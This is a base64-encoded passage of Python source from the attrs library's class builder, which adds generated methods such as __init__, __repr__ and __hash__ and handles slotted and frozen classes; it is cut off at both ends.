cCA9IF90cmFuc2Zvcm1fYXR0cnMoXG4gICAgICAgICAgICBjbHMsXG4gICAgICAgICAgICB0aGVzZSxcbiAgICAgICAgICAgIGF1dG9fYXR0cmlicyxcbiAgICAgICAgICAgIGt3X29ubHksXG4gICAgICAgICAgICBjb2xsZWN0X2J5X21ybyxcbiAgICAgICAgICAgIGZpZWxkX3RyYW5zZm9ybWVyLFxuICAgICAgICApXG5cbiAgICAgICAgc2VsZi5fY2xzID0gY2xzXG4gICAgICAgIHNlbGYuX2Nsc19kaWN0ID0gZGljdChjbHMuX19kaWN0X18pIGlmIHNsb3RzIGVsc2Uge31cbiAgICAgICAgc2VsZi5fYXR0cnMgPSBhdHRyc1xuICAgICAgICBzZWxmLl9iYXNlX25hbWVzID0gc2V0KGEubmFtZSBmb3IgYSBpbiBiYXNlX2F0dHJzKVxuICAgICAgICBzZWxmLl9iYXNlX2F0dHJfbWFwID0gYmFzZV9tYXBcbiAgICAgICAgc2VsZi5fYXR0cl9uYW1lcyA9IHR1cGxlKGEubmFtZSBmb3IgYSBpbiBhdHRycylcbiAgICAgICAgc2VsZi5fc2xvdHMgPSBzbG90c1xuICAgICAgICBzZWxmLl9mcm96ZW4gPSBmcm96ZW5cbiAgICAgICAgc2VsZi5fd2Vha3JlZl9zbG90ID0gd2Vha3JlZl9zbG90XG4gICAgICAgIHNlbGYuX2NhY2hlX2hhc2ggPSBjYWNoZV9oYXNoXG4gICAgICAgIHNlbGYuX2hhc19wcmVfaW5pdCA9IGJvb2woZ2V0YXR0cihjbHMsICJfX2F0dHJzX3ByZV9pbml0X18iLCBGYWxzZSkpXG4gICAgICAgIHNlbGYuX2hhc19wb3N0X2luaXQgPSBib29sKGdldGF0dHIoY2xzLCAiX19hdHRyc19wb3N0X2luaXRfXyIsIEZhbHNlKSlcbiAgICAgICAgc2VsZi5fZGVsZXRlX2F0dHJpYnMgPSBub3QgYm9vbCh0aGVzZSlcbiAgICAgICAgc2VsZi5faXNfZXhjID0gaXNfZXhjXG4gICAgICAgIHNlbGYuX29uX3NldGF0dHIgPSBvbl9zZXRhdHRyXG5cbiAgICAgICAgc2VsZi5faGFzX2N1c3RvbV9zZXRhdHRyID0gaGFzX2N1c3RvbV9zZXRhdHRyXG4gICAgICAgIHNlbGYuX3dyb3RlX293bl9zZXRhdHRyID0gRmFsc2VcblxuICAgICAgICBzZWxmLl9jbHNfZGljdFsiX19hdHRyc19hdHRyc19fIl0gPSBzZWxmLl9hdHRyc1xuXG4gICAgICAgIGlmIGZyb3plbjpcbiAgICAgICAgICAgIHNlbGYuX2Nsc19kaWN0WyJfX3NldGF0dHJfXyJdID0gX2Zyb3plbl9zZXRhdHRyc1xuICAgICAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9fZGVsYXR0cl9fIl0gPSBfZnJvemVuX2RlbGF0dHJzXG5cbiAgICAgICAgICAgIHNlbGYuX3dyb3RlX293bl9zZXRhdHRyID0gVHJ1ZVxuICAgICAgICBlbGlmIG9uX3NldGF0dHIgaW4gKFxuICAgICAgICAgICAgX25nX2RlZmF1bHRfb25fc2V0YXR0cixcbiAgICAgICAgICAgIHNldHRlcnMudmFsaWRhdGUsXG4gICAgICAgICAgICBzZXR0ZXJzLmNvbnZlcnQsXG4gICAgICAgICk6XG4gICAgICAgICAgICBoYXNfdmFsaWRhdG9yID0gaGFzX2NvbnZlcnRlciA9IEZhbHNlXG4gICAgICAgICAgICBmb3IgYSBpbiBhdHRyczpcbiAgICAgICAgICAgICAgICBpZiBhLnZhbGlkYXRvciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgaGFzX3ZhbGlkYXRvciA9IFRydWVcbiAgICAgICAgICAgICAgICBpZiBhLmNvbnZlcnRlciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgaGFzX2NvbnZlcnRlciA9IFRydWVcblxuICAgICAgICAgICAgICAgIGlmIGhhc192YWxpZGF0b3IgYW5kIGhhc19jb252ZXJ0ZXI6XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgKFxuICAgICAgICAgICAgICAgICAgICBvbl9zZXRhdHRyID09IF9uZ19kZWZhdWx0X29uX3NldGF0dHJcbiAgICAgICAgICAgICAgICAgICAgYW5kIG5vdCAoaGFzX3ZhbGlkYXRvciBvciBoYXNfY29udmVydGVyKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBvciAob25fc2V0YXR0ciA9PSBzZXR0ZXJzLnZhbGlkYXRlIGFuZCBub3QgaGFzX3ZhbGlkYXRvcilcbiAgICAgICAgICAgICAgICBvciAob25fc2V0YXR0ciA9PSBzZXR0ZXJzLmNvbnZlcnQgYW5kIG5vdCBoYXNfY29udmVydGVyKVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICAjIElmIGNsYXNzLWxldmVsIG9uX3NldGF0dHIgaXMgc2V0IHRvIGNvbnZlcnQgKyB2YWxpZGF0ZSwgYnV0XG4gICAgICAgICAgICAgICAgIyB0aGVyZVwncyBubyBmaWVsZCB0byBjb252ZXJ0IG9yIHZhbGlkYXRlLCBwcmV0ZW5kIGxpa2UgdGhlcmVcJ3NcbiAgICAgICAgICAgICAgICAjIG5vIG9uX3NldGF0dHIuXG4gICAgICAgICAgICAgICAgc2VsZi5fb25fc2V0YXR0ciA9IE5vbmVcblxuICAgICAgICBpZiBnZXRzdGF0ZV9zZXRzdGF0ZTpcbiAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICBzZWxmLl9jbHNfZGljdFsiX19nZXRzdGF0ZV9fIl0sXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9fc2V0c3RhdGVfXyJdLFxuICAgICAgICAgICAgKSA9IHNlbGYuX21ha2VfZ2V0c3RhdGVfc2V0c3RhdGUoKVxuXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxuICAgICAgICByZXR1cm4gIjxfQ2xhc3NCdWlsZGVyKGNscz17Y2xzfSk+Ii5mb3JtYXQoY2xzPXNlbGYuX2Nscy5fX25hbWVfXylcblxuICAgIGRlZiBidWlsZF9jbGFzcyhzZWxmKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEZpbmFsaXplIGNsYXNzIGJhc2VkIG9uIHRoZSBhY2N1bXVsYXRlZCBjb25maWd1cmF0aW9uLlxuXG4gICAgICAgIEJ1aWxkZXIgY2Fubm90IGJlIHVzZWQgYWZ0ZXIgY2FsbGluZyB0aGlzIG1ldGhvZC5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIHNlbGYuX3Nsb3RzIGlzIFRydWU6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fY3JlYXRlX3Nsb3RzX2NsYXNzKClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9wYXRjaF9vcmlnaW5hbF9jbGFzcygpXG5cbiAgICBkZWYgX3BhdGNoX29yaWdpbmFsX2NsYXNzKHNlbGYpOlxuICAgICAgICAiIiJcbiAgICAgICAgQXBwbHkgYWNjdW11bGF0ZWQgbWV0aG9kcyBhbmQgcmV0dXJuIHRoZSBjbGFzcy5cbiAgICAgICAgIiIiXG4gICAgICAgIGNscyA9IHNlbGYuX2Nsc1xuICAgICAgICBiYXNlX25hbWVzID0gc2VsZi5fYmFzZV9uYW1lc1xuXG4gICAgICAgICMgQ2xlYW4gY2xhc3Mgb2YgYXR0cmlidXRlIGRlZmluaXRpb25zIChgYXR0ci5pYigpYHMpLlxuICAgICAgICBpZiBzZWxmLl9kZWxldGVfYXR0cmliczpcbiAgICAgICAgICAgIGZvciBuYW1lIGluIHNlbGYuX2F0dHJfbmFtZXM6XG4gICAgICAgICAgICAgICAgaWYgKFxuICAgICAgICAgICAgICAgICAgICBuYW1lIG5vdCBpbiBiYXNlX25hbWVzXG4gICAgICAgICAgICAgICAgICAgIGFuZCBnZXRhdHRyKGNscywgbmFtZSwgX3NlbnRpbmVsKSBpcyBub3QgX3NlbnRpbmVsXG4gICAgICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgICAgICAgICAgZGVsYXR0cihjbHMsIG5hbWUpXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgICAgICMgVGhpcyBjYW4gaGFwcGVuIGlmIGEgYmFzZSBjbGFzcyBkZWZpbmVzIGEgY2xhc3NcbiAgICAgICAgICAgICAgICAgICAgICAgICMgdmFyaWFibGUgYW5kIHdlIHdhbnQgdG8gc2V0IGFuIGF0dHJpYnV0ZSB3aXRoIHRoZVxuICAgICAgICAgICAgICAgICAgICAgICAgIyBzYW1lIG5hbWUgYnkgdXNpbmcgb25seSBhIHR5cGUgYW5ub3RhdGlvbi5cbiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3NcblxuICAgICAgICAjIEF0dGFjaCBvdXIgZHVuZGVyIG1ldGhvZHMuXG4gICAgICAgIGZvciBuYW1lLCB2YWx1ZSBpbiBzZWxmLl9jbHNfZGljdC5pdGVtcygpOlxuICAgICAgICAgICAgc2V0YXR0cihjbHMsIG5hbWUsIHZhbHVlKVxuXG4gICAgICAgICMgSWYgd2VcJ3ZlIGluaGVyaXRlZCBhbiBhdHRycyBfX3NldGF0dHJfXyBhbmQgZG9uXCd0IHdyaXRlIG91ciBvd24sXG4gICAgICAgICMgcmVzZXQgaXQgdG8gb2JqZWN0XCdzLlxuICAgICAgICBpZiBub3Qgc2VsZi5fd3JvdGVfb3duX3NldGF0dHIgYW5kIGdldGF0dHIoXG4gICAgICAgICAgICBjbHMsICJfX2F0dHJzX293bl9zZXRhdHRyX18iLCBGYWxzZVxuICAgICAgICApOlxuICAgICAgICAgICAgY2xzLl9fYXR0cnNfb3duX3NldGF0dHJfXyA9IEZhbHNlXG5cbiAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9oYXNfY3VzdG9tX3NldGF0dHI6XG4gICAgICAgICAgICAgICAgY2xzLl9fc2V0YXR0cl9fID0gb2JqZWN0Ll9fc2V0YXR0cl9fXG5cbiAgICAgICAgcmV0dXJuIGNsc1xuXG4gICAgZGVmIF9jcmVhdGVfc2xvdHNfY2xhc3Moc2VsZik6XG4gICAgICAgICIiIlxuICAgICAgICBCdWlsZCBhbmQgcmV0dXJuIGEgbmV3IGNsYXNzIHdpdGggYSBgX19zbG90c19fYCBhdHRyaWJ1dGUuXG4gICAgICAgICIiIlxuICAgICAgICBjZCA9IHtcbiAgICAgICAgICAgIGs6IHZcbiAgICAgICAgICAgIGZvciBrLCB2IGluIGl0ZXJpdGVtcyhzZWxmLl9jbHNfZGljdClcbiAgICAgICAgICAgIGlmIGsgbm90IGluIHR1cGxlKHNlbGYuX2F0dHJfbmFtZXMpICsgKCJfX2RpY3RfXyIsICJfX3dlYWtyZWZfXyIpXG4gICAgICAgIH1cblxuICAgICAgICAjIElmIG91ciBjbGFzcyBkb2VzblwndCBoYXZlIGl0cyBvd24gaW1wbGVtZW50YXRpb24gb2YgX19zZXRhdHRyX19cbiAgICAgICAgIyAoZWl0aGVyIGZyb20gdGhlIHVzZXIgb3IgYnkgdXMpLCBjaGVjayB0aGUgYmFzZXMsIGlmIG9uZSBvZiB0aGVtIGhhc1xuICAgICAgICAjIGFuIGF0dHJzLW1hZGUgX19zZXRhdHRyX18sIHRoYXQgbmVlZHMgdG8gYmUgcmVzZXQuIFdlIGRvblwndCB3YWxrIHRoZVxuICAgICAgICAjIE1STyBiZWNhdXNlIHdlIG9ubHkgY2FyZSBhYm91dCBvdXIgaW1tZWRpYXRlIGJhc2UgY2xhc3Nlcy5cbiAgICAgICAgIyBYWFg6IFRoaXMgY2FuIGJlIGNvbmZ1c2VkIGJ5IHN1YmNsYXNzaW5nIGEgc2xvdHRlZCBhdHRycyBjbGFzcyB3aXRoXG4gICAgICAgICMgWFhYOiBhIG5vbi1hdHRycyBjbGFzcyBhbmQgc3ViY2xhc3MgdGhlIHJlc3VsdGluZyBjbGFzcyB3aXRoIGFuIGF0dHJzXG4gICAgICAgICMgWFhYOiBjbGFzcy4gIFNlZSBgdGVzdF9zbG90dGVkX2NvbmZ1c2VkYCBmb3IgZGV0YWlscy4gIEZvciBub3cgdGhhdFwnc1xuICAgICAgICAjIFhYWDogT0sgd2l0aCB1cy5cbiAgICAgICAgaWYgbm90IHNlbGYuX3dyb3RlX293bl9zZXRhdHRyOlxuICAgICAgICAgICAgY2RbIl9fYXR0cnNfb3duX3NldGF0dHJfXyJdID0gRmFsc2VcblxuICAgICAgICAgICAgaWYgbm90IHNlbGYuX2hhc19jdXN0b21fc2V0YXR0cjpcbiAgICAgICAgICAgICAgICBmb3IgYmFzZV9jbHMgaW4gc2VsZi5fY2xzLl9fYmFzZXNfXzpcbiAgICAgICAgICAgICAgICAgICAgaWYgYmFzZV9jbHMuX19kaWN0X18uZ2V0KCJfX2F0dHJzX293bl9zZXRhdHRyX18iLCBGYWxzZSk6XG4gICAgICAgICAgICAgICAgICAgICAgICBjZFsiX19zZXRhdHRyX18iXSA9IG9iamVjdC5fX3NldGF0dHJfX1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcblxuICAgICAgICAjIFRyYXZlcnNlIHRoZSBNUk8gdG8gY29sbGVjdCBleGlzdGluZyBzbG90c1xuICAgICAgICAjIGFuZCBjaGVjayBmb3IgYW4gZXhpc3RpbmcgX193ZWFrcmVmX18uXG4gICAgICAgIGV4aXN0aW5nX3Nsb3RzID0gZGljdCgpXG4gICAgICAgIHdlYWtyZWZfaW5oZXJpdGVkID0gRmFsc2VcbiAgICAgICAgZm9yIGJhc2VfY2xzIGluIHNlbGYuX2Nscy5fX21yb19fWzE6LTFdOlxuICAgICAgICAgICAgaWYgYmFzZV9jbHMuX19kaWN0X18uZ2V0KCJfX3dlYWtyZWZfXyIsIE5vbmUpIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgIHdlYWtyZWZfaW5oZXJpdGVkID0gVHJ1ZVxuICAgICAgICAgICAgZXhpc3Rpbmdfc2xvdHMudXBkYXRlKFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgbmFtZTogZ2V0YXR0cihiYXNlX2NscywgbmFtZSlcbiAgICAgICAgICAgICAgICAgICAgZm9yIG5hbWUgaW4gZ2V0YXR0cihiYXNlX2NscywgIl9fc2xvdHNfXyIsIFtdKVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIClcblxuICAgICAgICBiYXNlX25hbWVzID0gc2V0KHNlbGYuX2Jhc2VfbmFtZXMpXG5cbiAgICAgICAgbmFtZXMgPSBzZWxmLl9hdHRyX25hbWVzXG4gICAgICAgIGlmIChcbiAgICAgICAgICAgIHNlbGYuX3dlYWtyZWZfc2xvdFxuICAgICAgICAgICAgYW5kICJfX3dlYWtyZWZfXyIgbm90IGluIGdldGF0dHIoc2VsZi5fY2xzLCAiX19zbG90c19fIiwgKCkpXG4gICAgICAgICAgICBhbmQgIl9fd2Vha3JlZl9fIiBub3QgaW4gbmFtZXNcbiAgICAgICAgICAgIGFuZCBub3Qgd2Vha3JlZl9pbmhlcml0ZWRcbiAgICAgICAgKTpcbiAgICAgICAgICAgIG5hbWVzICs9ICgiX193ZWFrcmVmX18iLClcblxuICAgICAgICAjIFdlIG9ubHkgYWRkIHRoZSBuYW1lcyBvZiBhdHRyaWJ1dGVzIHRoYXQgYXJlblwndCBpbmhlcml0ZWQuXG4gICAgICAgICMgU2V0dGluZyBfX3Nsb3RzX18gdG8gaW5oZXJpdGVkIGF0dHJpYnV0ZXMgd2FzdGVzIG1lbW9yeS5cbiAgICAgICAgc2xvdF9uYW1lcyA9IFtuYW1lIGZvciBuYW1lIGluIG5hbWVzIGlmIG5hbWUgbm90IGluIGJhc2VfbmFtZXNdXG4gICAgICAgICMgVGhlcmUgYXJlIHNsb3RzIGZvciBhdHRyaWJ1dGVzIGZyb20gY3VycmVudCBjbGFzc1xuICAgICAgICAjIHRoYXQgYXJlIGRlZmluZWQgaW4gcGFyZW50IGNsYXNzZXMuXG4gICAgICAgICMgQXMgdGhlaXIgZGVzY3JpcHRvcnMgbWF5IGJlIG92ZXJyaWRlbiBieSBhIGNoaWxkIGNsYXNzLFxuICAgICAgICAjIHdlIGNvbGxlY3QgdGhlbSBoZXJlIGFuZCB1cGRhdGUgdGhlIGNsYXNzIGRpY3RcbiAgICAgICAgcmV1c2VkX3Nsb3RzID0ge1xuICAgICAgICAgICAgc2xvdDogc2xvdF9kZXNjcmlwdG9yXG4gICAgICAgICAgICBmb3Igc2xvdCwgc2xvdF9kZXNjcmlwdG9yIGluIGl0ZXJpdGVtcyhleGlzdGluZ19zbG90cylcbiAgICAgICAgICAgIGlmIHNsb3QgaW4gc2xvdF9uYW1lc1xuICAgICAgICB9XG4gICAgICAgIHNsb3RfbmFtZXMgPSBbbmFtZSBmb3IgbmFtZSBpbiBzbG90X25hbWVzIGlmIG5hbWUgbm90IGluIHJldXNlZF9zbG90c11cbiAgICAgICAgY2QudXBkYXRlKHJldXNlZF9zbG90cylcbiAgICAgICAgaWYgc2VsZi5fY2FjaGVfaGFzaDpcbiAgICAgICAgICAgIHNsb3RfbmFtZXMuYXBwZW5kKF9oYXNoX2NhY2hlX2ZpZWxkKVxuICAgICAgICBjZFsiX19zbG90c19fIl0gPSB0dXBsZShzbG90X25hbWVzKVxuXG4gICAgICAgIHF1YWxuYW1lID0gZ2V0YXR0cihzZWxmLl9jbHMsICJfX3F1YWxuYW1lX18iLCBOb25lKVxuICAgICAgICBpZiBxdWFsbmFtZSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIGNkWyJfX3F1YWxuYW1lX18iXSA9IHF1YWxuYW1lXG5cbiAgICAgICAgIyBDcmVhdGUgbmV3IGNsYXNzIGJhc2VkIG9uIG9sZCBjbGFzcyBhbmQgb3VyIG1ldGhvZHMuXG4gICAgICAgIGNscyA9IHR5cGUoc2VsZi5fY2xzKShzZWxmLl9jbHMuX19uYW1lX18sIHNlbGYuX2Nscy5fX2Jhc2VzX18sIGNkKVxuXG4gICAgICAgICMgVGhlIGZvbGxvd2luZyBpcyBhIGZpeCBmb3JcbiAgICAgICAgIyA8aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi1hdHRycy9hdHRycy9pc3N1ZXMvMTAyPi4gIE9uIFB5dGhvbiAzLFxuICAgICAgICAjIGlmIGEgbWV0aG9kIG1lbnRpb25zIGBfX2NsYXNzX19gIG9yIHVzZXMgdGhlIG5vLWFyZyBzdXBlcigpLCB0aGVcbiAgICAgICAgIyBjb21waWxlciB3aWxsIGJha2UgYSByZWZlcmVuY2UgdG8gdGhlIGNsYXNzIGluIHRoZSBtZXRob2QgaXRzZWxmXG4gICAgICAgICMgYXMgYG1ldGhvZC5fX2Nsb3N1cmVfX2AuICBTaW5jZSB3ZSByZXBsYWNlIHRoZSBjbGFzcyB3aXRoIGFcbiAgICAgICAgIyBjbG9uZSwgd2UgcmV3cml0ZSB0aGVzZSByZWZlcmVuY2VzIHNvIGl0IGtlZXBzIHdvcmtpbmcuXG4gICAgICAgIGZvciBpdGVtIGluIGNscy5fX2RpY3RfXy52YWx1ZXMoKTpcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoaXRlbSwgKGNsYXNzbWV0aG9kLCBzdGF0aWNtZXRob2QpKTpcbiAgICAgICAgICAgICAgICAjIENsYXNzLSBhbmQgc3RhdGljbWV0aG9kcyBoaWRlIHRoZWlyIGZ1bmN0aW9ucyBpbnNpZGUuXG4gICAgICAgICAgICAgICAgIyBUaGVzZSBtaWdodCBuZWVkIHRvIGJlIHJld3JpdHRlbiBhcyB3ZWxsLlxuICAgICAgICAgICAgICAgIGNsb3N1cmVfY2VsbHMgPSBnZXRhdHRyKGl0ZW0uX19mdW5jX18sICJfX2Nsb3N1cmVfXyIsIE5vbmUpXG4gICAgICAgICAgICBlbGlmIGlzaW5zdGFuY2UoaXRlbSwgcHJvcGVydHkpOlxuICAgICAgICAgICAgICAgICMgV29ya2Fyb3VuZCBmb3IgcHJvcGVydHkgYHN1cGVyKClgIHNob3J0Y3V0IChQWTMtb25seSkuXG4gICAgICAgICAgICAgICAgIyBUaGVyZSBpcyBubyB1bml2ZXJzYWwgd2F5IGZvciBvdGhlciBkZXNjcmlwdG9ycy5cbiAgICAgICAgICAgICAgICBjbG9zdXJlX2NlbGxzID0gZ2V0YXR0cihpdGVtLmZnZXQsICJfX2Nsb3N1cmVfXyIsIE5vbmUpXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGNsb3N1cmVfY2VsbHMgPSBnZXRhdHRyKGl0ZW0sICJfX2Nsb3N1cmVfXyIsIE5vbmUpXG5cbiAgICAgICAgICAgIGlmIG5vdCBjbG9zdXJlX2NlbGxzOiAgIyBDYXRjaCBOb25lIG9yIHRoZSBlbXB0eSBsaXN0LlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBmb3IgY2VsbCBpbiBjbG9zdXJlX2NlbGxzOlxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSBjZWxsLmNlbGxfY29udGVudHMgaXMgc2VsZi5fY2xzXG4gICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6ICAjIFZhbHVlRXJyb3I6IENlbGwgaXMgZW1wdHlcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGlmIG1hdGNoOlxuICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2Nsb3N1cmVfY2VsbChjZWxsLCBjbHMpXG5cbiAgICAgICAgcmV0dXJuIGNsc1xuXG4gICAgZGVmIGFkZF9yZXByKHNlbGYsIG5zKTpcbiAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9fcmVwcl9fIl0gPSBzZWxmLl9hZGRfbWV0aG9kX2R1bmRlcnMoXG4gICAgICAgICAgICBfbWFrZV9yZXByKHNlbGYuX2F0dHJzLCBucywgc2VsZi5fY2xzKVxuICAgICAgICApXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgYWRkX3N0cihzZWxmKTpcbiAgICAgICAgcmVwciA9IHNlbGYuX2Nsc19kaWN0LmdldCgiX19yZXByX18iKVxuICAgICAgICBpZiByZXByIGlzIE5vbmU6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxuICAgICAgICAgICAgICAgICJfX3N0cl9fIGNhbiBvbmx5IGJlIGdlbmVyYXRlZCBpZiBhIF9fcmVwcl9fIGV4aXN0cy4iXG4gICAgICAgICAgICApXG5cbiAgICAgICAgZGVmIF9fc3RyX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fX3JlcHJfXygpXG5cbiAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9fc3RyX18iXSA9IHNlbGYuX2FkZF9tZXRob2RfZHVuZGVycyhfX3N0cl9fKVxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIF9tYWtlX2dldHN0YXRlX3NldHN0YXRlKHNlbGYpOlxuICAgICAgICAiIiJcbiAgICAgICAgQ3JlYXRlIGN1c3RvbSBfX3NldHN0YXRlX18gYW5kIF9fZ2V0c3RhdGVfXyBtZXRob2RzLlxuICAgICAgICAiIiJcbiAgICAgICAgIyBfX3dlYWtyZWZfXyBpcyBub3Qgd3JpdGFibGUuXG4gICAgICAgIHN0YXRlX2F0dHJfbmFtZXMgPSB0dXBsZShcbiAgICAgICAgICAgIGFuIGZvciBhbiBpbiBzZWxmLl9hdHRyX25hbWVzIGlmIGFuICE9ICJfX3dlYWtyZWZfXyJcbiAgICAgICAgKVxuXG4gICAgICAgIGRlZiBzbG90c19nZXRzdGF0ZShzZWxmKTpcbiAgICAgICAgICAgICIiIlxuICAgICAgICAgICAgQXV0b21hdGljYWxseSBjcmVhdGVkIGJ5IGF0dHJzLlxuICAgICAgICAgICAgIiIiXG4gICAgICAgICAgICByZXR1cm4gdHVwbGUoZ2V0YXR0cihzZWxmLCBuYW1lKSBmb3IgbmFtZSBpbiBzdGF0ZV9hdHRyX25hbWVzKVxuXG4gICAgICAgIGhhc2hfY2FjaGluZ19lbmFibGVkID0gc2VsZi5fY2FjaGVfaGFzaFxuXG4gICAgICAgIGRlZiBzbG90c19zZXRzdGF0ZShzZWxmLCBzdGF0ZSk6XG4gICAgICAgICAgICAiIiJcbiAgICAgICAgICAgIEF1dG9tYXRpY2FsbHkgY3JlYXRlZCBieSBhdHRycy5cbiAgICAgICAgICAgICIiIlxuICAgICAgICAgICAgX19ib3VuZF9zZXRhdHRyID0gX29ial9zZXRhdHRyLl9fZ2V0X18oc2VsZiwgQXR0cmlidXRlKVxuICAgICAgICAgICAgZm9yIG5hbWUsIHZhbHVlIGluIHppcChzdGF0ZV9hdHRyX25hbWVzLCBzdGF0ZSk6XG4gICAgICAgICAgICAgICAgX19ib3VuZF9zZXRhdHRyKG5hbWUsIHZhbHVlKVxuXG4gICAgICAgICAgICAjIFRoZSBoYXNoIGNvZGUgY2FjaGUgaXMgbm90IGluY2x1ZGVkIHdoZW4gdGhlIG9iamVjdCBpc1xuICAgICAgICAgICAgIyBzZXJpYWxpemVkLCBidXQgaXQgc3RpbGwgbmVlZHMgdG8gYmUgaW5pdGlhbGl6ZWQgdG8gTm9uZSB0b1xuICAgICAgICAgICAgIyBpbmRpY2F0ZSB0aGF0IHRoZSBmaXJzdCBjYWxsIHRvIF9faGFzaF9fIHNob3VsZCBiZSBhIGNhY2hlXG4gICAgICAgICAgICAjIG1pc3MuXG4gICAgICAgICAgICBpZiBoYXNoX2NhY2hpbmdfZW5hYmxlZDpcbiAgICAgICAgICAgICAgICBfX2JvdW5kX3NldGF0dHIoX2hhc2hfY2FjaGVfZmllbGQsIE5vbmUpXG5cbiAgICAgICAgcmV0dXJuIHNsb3RzX2dldHN0YXRlLCBzbG90c19zZXRzdGF0ZVxuXG4gICAgZGVmIG1ha2VfdW5oYXNoYWJsZShzZWxmKTpcbiAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9faGFzaF9fIl0gPSBOb25lXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgYWRkX2hhc2goc2VsZik6XG4gICAgICAgIHNlbGYuX2Nsc19kaWN0WyJfX2hhc2hfXyJdID0gc2VsZi5fYWRkX21ldGhvZF9kdW5kZXJzKFxuICAgICAgICAgICAgX21ha2VfaGFzaChcbiAgICAgICAgICAgICAgICBzZWxmLl9jbHMsXG4gICAgICAgICAgICAgICAgc2VsZi5fYXR0cnMsXG4gICAgICAgICAgICAgICAgZnJvemVuPXNlbGYuX2Zyb3plbixcbiAgICAgICAgICAgICAgICBjYWNoZV9oYXNoPXNlbGYuX2NhY2hlX2hhc2gsXG4gICAgICAgICAgICApXG4gICAgICAgIClcblxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIGFkZF9pbml0KHNlbGYpOlxuICAgICAgICBzZWxmLl9jbHNfZGljdFsiX19pbml0X18iXSA9IHNlbGYuX2FkZF9tZXRob2RfZHVuZGVycyhcbiAgICAgICAgICAgIF9tYWtlX2luaXQoXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xzLFxuICAgICAgICAgICAgICAgIHNlbGYuX2F0dHJzLFxuICAgICAgICAgICAgICAgIHNlbGYuX2hhc19wcmVfaW5pdCxcbiAgICAgICAgICAgICAgICBzZWxmLl9oYXNfcG9zdF9pbml0LFxuICAgICAgICAgICAgICAgIHNlbGYuX2Zyb3plbixcbiAgICAgICAgICAgICAgICBzZWxmLl9zbG90cyxcbiAgICAgICAgICAgICAgICBzZWxmLl9jYWNoZV9oYXNoLFxuICAgICAgICAgICAgICAgIHNlbGYuX2Jhc2VfYXR0cl9tYXAsXG4gICAgICAgICAgICAgICAgc2VsZi5faXNfZXhjLFxuICAgICAgICAgICAgICAgIHNlbGYuX29uX3NldGF0dHIsXG4gICAgICAgICAgICAgICAgYXR0cnNfaW5pdD1GYWxzZSxcbiAgICAgICAgICAgIClcbiAgICAgICAgKVxuXG4gICAgICAgIHJldHVybiBzZWxmXG5cbiAgICBkZWYgYWRkX21hdGNoX2FyZ3Moc2VsZik6XG4gICAgICAgIHNlbGYuX2Nsc19kaWN0WyJfX21hdGNoX2FyZ3NfXyJdID0gdHVwbGUoXG4gICAgICAgICAgICBmaWVsZC5uYW1lXG4gICAgICAgICAgICBmb3IgZmllbGQgaW4gc2VsZi5fYXR0cnNcbiAgICAgICAgICAgIGlmIGZpZWxkLmluaXQgYW5kIG5vdCBmaWVsZC5rd19vbmx5XG4gICAgICAgIClcblxuICAgIGRlZiBhZGRfYXR0cnNfaW5pdChzZWxmKTpcbiAgICAgICAgc2VsZi5fY2xzX2RpY3RbIl9fYXR0cnNfaW5pdF9fIl0gPSBzZWxmLl9hZGRfbWV0aG9kX2R1bmRlcnMoXG4gICAgICAgICAgICBfbWFrZV9pbml0KFxuICAgICAgICAgICAgICAgIHNlbGYuX2NscyxcbiAgICAgICAgICAgICAgICBzZWxmLl9hdHRycyxcbiAgICAgICAgICAgICAgICBzZWxmLl9oYXNfcHJlX2luaXQsXG4gICAgICAgICAgICAgICAgc2VsZi5faGFzX3Bvc3RfaW5pdCxcbiAgICAgICAgICAgICAgICBzZWxmLl9mcm96ZW4sXG4gICAgICAgICAgICAgICAgc2VsZi5fc2xvdHMsXG4gICAgICAgICAgI